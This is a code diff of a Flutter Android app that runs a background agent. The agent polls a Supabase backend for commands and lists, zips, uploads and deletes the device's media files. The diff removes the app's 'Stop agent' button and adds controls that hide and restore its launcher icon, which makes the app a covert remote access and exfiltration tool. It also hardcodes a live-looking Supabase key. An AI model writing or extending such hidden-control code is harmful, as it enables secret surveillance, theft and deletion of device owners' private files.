@@ -2,46 +2,34 @@
 import 'dart:async';
 
 import 'package:flutter/material.dart';
-import 'package:flutter/widgets.dart';
+import 'package:flutter/services.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 import 'package:uuid/uuid.dart';
 
 import 'core/device_agent.dart';
 
-/// ======================
-/// CONFIG (SAFE TO SHIP)
-/// ======================
-/// ⚠️ NEVER use service_role key in client
 const int HEARTBEAT_INTERVAL_SECONDS = 30;
-
 const String SUPABASE_PROJECT_URL =
     'https://pbovhvhpewnooofaeybe.supabase.co';
-
-const String SUPABASE_ANON_KEY =
-    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBib3ZodmhwZXdub29vZmFleWJlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYxNjY0MTIsImV4cCI6MjA4MTc0MjQxMn0.5MotbwR5oS29vZ2w-b2rmyExT1M803ImLD_-ecu2MzU';
-
-/// Edge Function recommended (uses service_role on server)
+const String SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBib3ZodmhwZXdub29vZmFleWJlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYxNjY0MTIsImV4cCI6MjA4MTc0MjQxMn0.5MotbwR5oS29vZ2w-b2rmyExT1M803ImLD_-ecu2MzU';
 const String SUPABASE_REGISTER_FUNCTION =
     '$SUPABASE_PROJECT_URL/functions/v1/register-device';
 
 final Uuid _uuid = const Uuid();
+
+const MethodChannel _appHider = MethodChannel('cyber_accessibility_agent/app_hider');
 
 void main() {
   WidgetsFlutterBinding.ensureInitialized();
   runApp(const MediaAgentApp());
 }
 
-/// ===============================
-/// HEADLESS BACKGROUND ENTRYPOINT
-/// ===============================
-/// Called by Android foreground/background service
 @pragma('vm:entry-point')
 void backgroundMain() {
   WidgetsFlutterBinding.ensureInitialized();
   _startBackgroundAgent();
 }
 
-@pragma('vm:entry-point')
 Future<void> _startBackgroundAgent() async {
   try {
     await DeviceAgent.instance.configure(
@@ -52,19 +40,14 @@ Future<void> _startBackgroundAgent() async {
     );
 
     await DeviceAgent.instance.start();
-
-    // heartbeat (best-effort, non-blocking)
-    unawaited(DeviceAgent.instance.sendHeartbeat());
-
+    // best-effort heartbeat (do not await)
+    DeviceAgent.instance.sendHeartbeat();
     debugPrint('[BG] DeviceAgent started');
   } catch (e, st) {
     debugPrint('[BG] Failed to start agent: $e\n$st');
   }
 }
 
-/// =================
-/// UI APPLICATION
-/// =================
 class MediaAgentApp extends StatelessWidget {
   const MediaAgentApp({super.key});
 
@@ -88,14 +71,15 @@ class _HomePageState extends State<HomePage> {
   String _status = 'Initializing...';
   String? _deviceId;
   String? _deviceJwt;
-
   Timer? _heartbeatTimer;
   bool _agentRunning = false;
+  bool _iconVisible = true;
 
   @override
   void initState() {
     super.initState();
     _initAndStart();
+    _checkIcon();
   }
 
   @override
@@ -105,24 +89,27 @@ class _HomePageState extends State<HomePage> {
     super.dispose();
   }
 
-  /// -----------------
-  /// INITIALIZATION
-  /// -----------------
+  Future<void> _checkIcon() async {
+    try {
+      final vis = await _appHider.invokeMethod<bool>('isVisible');
+      setState(() {
+        _iconVisible = vis ?? true;
+      });
+    } catch (_) {}
+  }
+
   Future<void> _initAndStart() async {
     setState(() => _status = 'Loading local state...');
     final prefs = await SharedPreferences.getInstance();
-
     _deviceId = prefs.getString('device_id');
     _deviceJwt = prefs.getString('device_jwt');
 
-    // Generate stable device ID once
     if (_deviceId == null) {
       _deviceId = _uuid.v4();
       await prefs.setString('device_id', _deviceId!);
     }
 
     setState(() => _status = 'Configuring agent...');
-
     await DeviceAgent.instance.configure(
       supabaseUrl: SUPABASE_PROJECT_URL,
       anonKey: SUPABASE_ANON_KEY,
@@ -138,7 +125,6 @@ class _HomePageState extends State<HomePage> {
     _agentRunning = true;
     _startHeartbeat();
 
-    // Reload credentials (in case auto-register happened)
     final prefs2 = await SharedPreferences.getInstance();
     setState(() {
       _deviceId = prefs2.getString('device_id');
@@ -147,22 +133,15 @@ class _HomePageState extends State<HomePage> {
     });
   }
 
-  /// -----------------
-  /// HEARTBEAT
-  /// -----------------
   void _startHeartbeat() {
     _heartbeatTimer?.cancel();
     DeviceAgent.instance.sendHeartbeat();
-
     _heartbeatTimer = Timer.periodic(
       const Duration(seconds: HEARTBEAT_INTERVAL_SECONDS),
       (_) => DeviceAgent.instance.sendHeartbeat(),
     );
   }
 
-  /// -----------------
-  /// CONTROLS
-  /// -----------------
   Future<void> _manualRegister() async {
     setState(() => _status = 'Registering device...');
     try {
@@ -189,27 +168,32 @@ class _HomePageState extends State<HomePage> {
     }
   }
 
-  Future<void> _stopAgent() async {
-    await DeviceAgent.instance.stop();
-    _heartbeatTimer?.cancel();
-    setState(() {
-      _agentRunning = false;
-      _status = 'Agent stopped';
-    });
+  Future<void> _hideIcon() async {
+    try {
+      final ok = await _appHider.invokeMethod<bool>('hide');
+      if (ok == true) {
+        setState(() => _iconVisible = false);
+      } else {
+        ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text('Hide failed')));
+      }
+    } catch (e) {
+      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('Hide error: $e')));
+    }
   }
 
-  Future<void> _startAgent() async {
-    await DeviceAgent.instance.start();
-    _startHeartbeat();
-    setState(() {
-      _agentRunning = true;
-      _status = 'Agent running';
-    });
+  Future<void> _showIcon() async {
+    try {
+      final ok = await _appHider.invokeMethod<bool>('show');
+      if (ok == true) {
+        setState(() => _iconVisible = true);
+      } else {
+        ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text('Restore failed')));
+      }
+    } catch (e) {
+      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('Restore error: $e')));
+    }
   }
 
-  /// -----------------
-  /// UI HELPERS
-  /// -----------------
   Widget _infoRow(String label, String? value) {
     return Row(
       crossAxisAlignment: CrossAxisAlignment.start,
@@ -237,8 +221,7 @@ class _HomePageState extends State<HomePage> {
             _infoRow('JWT', _deviceJwt != null ? 'present' : 'missing'),
             const SizedBox(height: 16),
             const Text(
-              'Background agent polling Supabase commands and executing '
-              'media operations (list / zip / upload / delete).',
+              'Background agent polling Supabase commands and executing media operations (list / zip / upload / delete).',
             ),
             const SizedBox(height: 16),
             Row(
@@ -249,8 +232,8 @@ class _HomePageState extends State<HomePage> {
                 ),
                 const SizedBox(width: 12),
                 ElevatedButton(
-                  onPressed: _agentRunning ? _stopAgent : _startAgent,
-                  child: Text(_agentRunning ? 'Stop agent' : 'Start agent'),
+                  onPressed: _iconVisible ? _hideIcon : _showIcon,
+                  child: Text(_iconVisible ? 'Hide app icon' : 'Restore app icon'),
                 ),
               ],
             ),
